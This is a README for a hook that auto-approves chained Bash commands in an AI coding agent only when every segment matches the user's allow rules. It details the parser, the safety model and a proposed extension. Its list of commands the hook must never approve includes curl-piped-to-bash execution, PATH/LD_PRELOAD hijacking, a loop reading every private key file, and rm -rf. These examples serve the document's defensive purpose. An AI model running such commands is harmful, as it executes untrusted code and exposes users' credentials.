# approve-allowlisted-chains

A Claude Code **PreToolUse** hook that auto-approves a chained Bash command when — and
only when — every command in the chain is already individually allowed by your
permission rules.

## Why this exists

Claude Code's built-in permission check already decomposes *simple* command chains and
auto-approves them when each piece matches an allow rule. But it bails to a manual
prompt on some chain shapes — empirically, mixing `&&` and `;` across many segments.
This command prompted even though every segment was individually allowlisted:

```
cd ~/dev/x && git rev-parse --abbrev-ref HEAD 2>&1; echo "---"; git rev-parse --short HEAD 2>&1; echo "---"; git log --oneline -1 2>&1
```

This hook closes that gap without loosening safety.

It also closes a second, unrelated gap: a command invoked by absolute path
(`/usr/bin/tail -1`) is a different literal string than the allowlisted bare form
(`tail *`), so CC's own prefix matching treats them as unrelated and prompts again —
even for a single command, not just a chain. Rather than adding a parallel
`Bash(/usr/bin/tail *)` rule for every tool and every bin directory it might resolve to,
this hook canonicalizes the command name (only the command name, never arguments) back to
its bare form before matching, so one allow rule covers every absolute-path spelling.

## What it does

On every Bash tool call it:

1. Parses the command with **bashlex** (a pure-Python port of bash's own grammar).
2. Refuses — stays silent, so a normal prompt happens — if the command is anything other
   than a plain chain of simple commands (see *Safety model*).
3. Splits the chain into segments. For each segment, canonicalizes just the leading command
   word if it's an absolute path into a known bin directory (`/usr/bin/tail` -> `tail`), and
   checks both the raw and canonicalized forms against your `Bash(...)` allow/deny rules.
4. Emits `permissionDecision: "allow"` only if **every** segment (including any nested
   inside a command/process substitution) matches an allow rule and **none** matches a deny
   rule, **and** either there are **≥2 top-level segments** (a chain) **or** there's exactly
   one top-level segment whose canonicalization is what made it match (a single
   absolute-path command). A single ordinary command that already matches in its raw form
   is left to Claude Code's own native matching, unchanged from before.
5. Otherwise prints nothing and exits 0, so Claude Code prompts as usual.

It **never** emits `deny`.

## Safety model

The only dangerous divergence from Claude Code is *over*-approval — approving something CC
would not. The design makes that impossible instead of trying to replicate CC exactly:

- **Faithful parsing.** Splitting and danger-detection use bashlex, not string scanning, so
  we agree with the shell that actually runs the command. Refused outright: compound
  commands (subshells, groups, `for`/`while`/`if`/`case`), function definitions, inline
  `VAR=val` assignments, and heredocs.
- **Real-file redirects are allowed only in a narrow, literal, resolvable case.** A
  redirect is approved if it's an fd-dup (`2>&1`), `/dev/null`, *or* an output redirect
  (`>`/`>>`) where the target is: (a) **literal text** — no `$VAR`, `$(...)`, or backticks,
  so the actual path can't depend on anything the hook can't see; (b) an **absolute path**
  — a relative path's real location depends on the effective cwd, which an earlier `cd` in
  the same chain could have changed, so it's always refused rather than guessed; (c) an
  extension in `_SAFE_REDIRECT_EXTENSIONS` (`.log`, `.out`, `.err`, `.tmp` — deliberately
  *not* `.txt`, since `requirements.txt`/`CMakeLists.txt` are load-bearing manifests with
  that extension); and (d) under one of `_load_safe_redirect_dirs()` — the current project
  directory, `permissions.additionalDirectories` from your settings files, and the OS
  scratch dirs (`/tmp`, `/private/tmp`, `$TMPDIR`). That directory list only reuses places
  Claude Code is *already* trusted to read/write via Edit/Write; the hook doesn't grant a
  new capability, only skips a prompt for a command-line redirect into the same space. Any
  redirect that fails any one of those checks — including every input redirect (`<`) — is
  refused outright, same as before.
- **Command/process substitution is recursed into, not refused.** `$(...)`, backticks, and
  `<(...)` are not banned outright — the substitution's inner command is walked as just
  another segment, subject to the same allow/deny check and the same unsafe-construct
  detection (recursively — a dangerous construct nested inside a substitution still
  refuses the whole command). This is safe because substitution output only ever becomes
  argument *text* in the outer command; it's never re-parsed as shell syntax, so it can't
  smuggle in a new command. Only *top-level* segments count toward the "≥2 segments" gate,
  so a lone command that merely contains a substitution (e.g.
  `cat "$(git rev-parse --show-toplevel)/x"`) still isn't treated as a chain — it's left to
  Claude Code's own single-command matching.
- **Conservative allow matching.** `_allow_matches` is a deliberate *subset* of CC's rule
  semantics: exact match, or a single trailing wildcard (`verb *`, `verb:*`, `verb*`). Any
  mid-string or repeated `*` is treated as no-match. Under-matching only ever costs a
  prompt; it can never approve something CC would reject.
- **Liberal deny matching + backstop.** `_deny_matches` treats `*` as a full wildcard so it
  never *misses* a deny. And Claude Code re-applies its own deny rules *after* this hook
  regardless (a deny beats a hook's allow — verified), so a denied command is blocked even
  if this hook were wrong.
- **Narrow, one-directional path canonicalization.** `_canonicalize_command_word` only
  strips a directory prefix that's an *exact* match against a small fixed allowlist of known
  bin directories (`_KNOWN_BIN_DIRS`), and only from a segment's first word (the command
  name) — arguments are never touched, so it can't be used to disguise a different command
  or manufacture a false wildcard match. Every segment is checked against allow/deny rules
  in *both* its raw and canonicalized form, so canonicalizing can only ever give a deny rule
  an extra chance to match — never a way to dodge one.
- **Fail-safe.** Any parse error, unknown construct, missing dependency, or unexpected input
  → print nothing, exit 0 → normal prompt.

Net: this hook can only ever make Claude Code prompt *more* than it would on its own, never
less.

## Proposed extension: compound commands (not yet implemented)

Today the hook refuses *any* `for`/`while`/`if`/`case`/subshell/group outright, even when
every command inside it is individually allowlisted. The goal for a future version: approve
compound commands too, as long as every command that could possibly execute — across every
loop iteration and every branch — is already on the allowlist. The examples below are a
discussion draft, not implemented behavior; nothing here changes what the hook does yet.

### Should eventually auto-approve

These are compound, but every command that can possibly run is already allowlisted, and
the *shape* of the compound (what values it can take, which branches exist) is fully
visible in the static text — nothing depends on runtime data outside the command itself.

1. **Loop over a literal, static list** — the set of values `$region` can take is written
   right there in the command, so every possible expansion is still a `git -C * log *` call:
   ```
   for region in dev stage prod; do
     git -C ~/dev/ao-deploy log --oneline -1 origin/$region
   done
   ```

2. **`if`/`else` where every branch is allowlisted** — whichever branch runs, only
   `git -C * status *` and `echo *` execute:
   ```
   if git -C ~/dev/ao status --short; then
     echo clean
   else
     echo dirty
   fi
   ```

3. **`case` where every branch is allowlisted:**
   ```
   case "$branch" in
     main|release/*) git -C ~/dev/ao log --oneline -5 ;;
     *) echo "not a release branch" ;;
   esac
   ```

4. **Subshell used only for grouping/scoping**, containing nothing but allowlisted
   commands — the parens just keep `cd` from leaking into the parent shell:
   ```
   (cd ~/dev/ao && git status --short && git log --oneline -3)
   ```

5. **Loop over a bounded, allowlisted command-substitution result** — `git diff
   --name-only` is a scoped, allowlisted read, so every iteration only ever runs `grep *`:
   ```
   for f in $(git -C ~/dev/ao diff --name-only); do
     grep -n TODO "$f"
   done
   ```

### Must never auto-approve, even after the extension

1. **Inline assignment that hijacks command resolution** — the visible command name
   matches an allow rule, but the assignment changes what actually runs underneath it:
   ```
   PATH=/tmp/evil:$PATH ls
   LD_PRELOAD=/tmp/x.so grep foo bar.txt
   ```

2. **A branch containing even one non-allowlisted or destructive command** — refusing
   must be all-or-nothing across every branch, not per-visible-branch:
   ```
   if [ -f /tmp/marker ]; then
     echo ok
   else
     rm -rf /tmp/scratch
   fi
   ```

3. **Piping an allowlisted command into something that executes the result** — remote
   code execution dressed up as a "safe" `curl`/`cat`:
   ```
   curl -s https://example.com/install.sh | bash
   for u in $(cat urls.txt); do curl -s "$u" | sh; done
   ```

4. **Loop whose iteration source is unbounded or externally controlled**, even though
   every command in the body is individually allowlisted — the danger is in the
   aggregate, not any single segment:
   ```
   for f in $(find / -name '*.pem' -o -name '*.key' 2>/dev/null); do
     cat "$f"
   done
   ```

5. **Nested compounds, or a compound containing a real-file redirect** — proving safety
   for arbitrary nesting depth is exactly the kind of exhaustiveness this hook's design
   philosophy avoids:
   ```
   for i in 1 2 3; do (echo "$i" > /tmp/out_$i.txt); done
   ```

### Gray area — needs a decision before implementing

- A loop whose iteration source is itself allowlisted but broad (`find .` with no scope,
  or a `gh api` list call returning hundreds of items) — bounded in principle, but not
  bounded the way a literal list is. Where's the cutoff?
- Whether a `while read -r line; do ...; done < file` counts as "data-dependent iteration"
  the same way `for f in $(find ...)` does.
- Whether to walk one level of nested compound (subshell inside a `for`) or refuse all
  nesting unconditionally, as now.

## How it's wired

Registered in `~/.claude/settings.json` under `hooks.PreToolUse`, matcher `Bash`:

```json
{
  "matcher": "Bash",
  "hooks": [
    { "type": "command",
      "command": "/usr/bin/env python3 /Users/<you>/.claude/hooks/approve-allowlisted-chains/approve-allowlisted-chains.py",
      "timeout": 10 }
  ]
}
```

Several PreToolUse hooks can coexist; each decides independently. An `allow` from this hook
grants permission unless a deny rule (which CC always re-checks) blocks it.

## Dependency — one-time setup

The hook needs one package, **bashlex**. Install it once, with one command:

```
uv pip install --target ~/.claude/hooks/approve-allowlisted-chains/vendor bashlex
```

That's the whole setup. It drops bashlex into `vendor/` right next to the hook, which the
script adds to `sys.path` at startup — so it works under whatever `python3` Claude Code
runs the hook with, no venv to activate and no system `pip` to fight (on macOS this also
sidesteps Homebrew python's `externally-managed-environment` / PEP 668 refusal of a plain
`pip install`).

If bashlex is missing, the hook simply does nothing and you get normal
permission prompts, so a fresh clone degrades gracefully until you run it.

## Diagnostics

```
# Explain the verdict for a command against your REAL settings:
python3 approve-allowlisted-chains.py --check < cmd.txt

# cmd.txt holds the raw command (a file avoids shell-quoting headaches).
```

`--check` prints AUTO-APPROVE / DEFER plus a per-segment breakdown showing which rule
matched, or why the command was refused.

## Testing

- **Quick smoke test** (only needs the vendored bashlex):
  ```
  python3 approve-allowlisted-chains.py --selftest
  ```
- **Full unit suite:**
  ```
  python3 test_approve_allowlisted_chains.py     # standalone runner, no pytest needed
  pytest  test_approve_allowlisted_chains.py     # or under pytest
  ```

Both use fixed in-code rule fixtures (never your live settings) so results are
deterministic.

## Extending

The pieces are deliberately small and separable:

| Function | Responsibility |
|---|---|
| `_load_rules()`   | Read `Bash(...)` allow/deny patterns from the settings files CC reads. |
| `_bash_patterns()`| Pull inner patterns out of `Bash(...)` rule strings. |
| `_allow_matches()`| Conservative allow match. Extend *carefully* — looser matching risks over-approval. |
| `_deny_matches()` | Liberal deny match. Safe to widen; widening only adds prompts. |
| `_KNOWN_BIN_DIRS` | Fixed set of directories a command name may be canonicalized from. Widen *carefully* — only add directories that exclusively hold trusted system/package-manager binaries. |
| `_canonicalize_command_word()` / `_canonicalize_segment()` | Strip a known bin-dir prefix from a segment's command name only, for allow/deny matching. |
| `_SAFE_REDIRECT_EXTENSIONS` | Extensions a real-file redirect target may end in. Widen *carefully* — only add extensions with no plausible critical-config use. |
| `_load_safe_redirect_dirs()` | Directories a real-file redirect target may live under: project dir + `additionalDirectories` from settings + OS scratch dirs. |
| `_under_safe_dir()` | `realpath`-resolves both the target and each safe dir before comparing, so symlinked prefixes (e.g. macOS `/tmp` -> `/private/tmp`) can't cause a false mismatch either way. |
| `_ChainInspector` | bashlex AST visitor: collects segments (recursing into substitutions), flags unsafe constructs, and gates real-file redirects on `visitredirect` per the safety model above. |
| `_inspect()`      | Parse + walk → `(segments, top_level_count, reason)`. Takes an optional `safe_dirs` list. |
| `decide()`        | End-to-end `(command, allow, deny, safe_dirs=None) -> bool`. `safe_dirs=None` loads live settings/env; pass a fixed list for deterministic tests. |

When you change any of these, **add a case** to `test_approve_allowlisted_chains.py` (and,
for a quick built-in check, to `_selftest()` in the script). Golden rule for
`_allow_matches`: if you're unsure whether a change could match something CC wouldn't,
don't — bail instead.

## Known limitations (all fail *safe* — toward prompting)

- **Relative-path real-file redirects always refuse**, even with `safe_dirs` configured
  and a safe extension — resolving them correctly would require knowing the effective cwd,
  which an earlier `cd` in the same chain could have changed. Use an absolute path.
- **Quoted `python3 -c "..."`-style rules don't match inside chains.** bashlex normalizes
  the outer quotes away, so the extracted segment (`python3 -c import yaml; ...`) can't match
  a quote-bearing rule. Standalone, CC still matches such rules directly. For inline use,
  prefer a wrapper script allowlisted by path.
- **Mid-string `*` allow rules are ignored** (e.g. `gh api repos/*/statuses *`). Conservative
  by design; such chains just prompt.
- **bash grammar, not zsh.** Exotic zsh-only syntax may not parse → bail → prompt.
- **`~/.claude/settings.local.json` is not read** (uncertain whether CC applies it to
  permissions; omitting it only makes the hook more conservative).
- **Path canonicalization only recognizes a fixed list of bin directories**
  (`_KNOWN_BIN_DIRS`) — an absolute path elsewhere (e.g. a project-local
  `node_modules/.bin/`, or a Homebrew Cellar path) is left unchanged and just prompts, same
  as before this feature existed.

## Files

Everything is self-contained in `~/.claude/hooks/approve-allowlisted-chains/`:

```
approve-allowlisted-chains.py          the hook + --selftest + --check
README.md                              this file
test_approve_allowlisted_chains.py     unit suite
vendor/                                vendored bashlex
```
